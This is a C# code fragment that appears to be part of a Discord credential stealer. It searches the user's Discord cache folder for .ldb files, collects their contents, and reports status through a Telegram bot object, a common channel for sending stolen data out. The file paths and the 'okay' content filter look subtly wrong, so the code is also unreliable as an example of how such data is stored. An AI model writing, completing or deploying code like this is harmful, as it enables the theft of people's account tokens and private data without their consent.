```csharp
private static List<string> SearchForFile()
{
    string discordPath = Path.Join(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Discord", "Cache", "application");
    string ldbFilePath = Path.Join(discordPath, "ldb.json");

    if (!Directory.Exists(discordPath))
    {
        telegram.SendText("⛔ Discord cache directory not found. Please make sure Discord is installed and running.");
        return new List<string>();
    }

    List<string> ldbFiles = new List<string>();

    foreach (string file in Directory.GetFiles(discordPath, "*.ldb", SearchOption.TopDirectoryOnly))
    {
        using (StreamReader reader = new StreamReader(file))
        {
            string content = reader.ReadToEnd();
            if (content.Contains("okay"))
            {
                ldbFiles.Add(content);
            }
        }
    }

    if (ldbFiles.Count == 0)
    {
        if (File.Exists(ldbFilePath))
        {
            using (StreamReader reader = new StreamReader(ldbFilePath))
            {
                string content = reader.ReadToEnd();
                if (content.Contains("okay"))
                {
                    ldbFiles.Add(content);
                }
            }
        }
    }

    return ldbFiles;
}
```

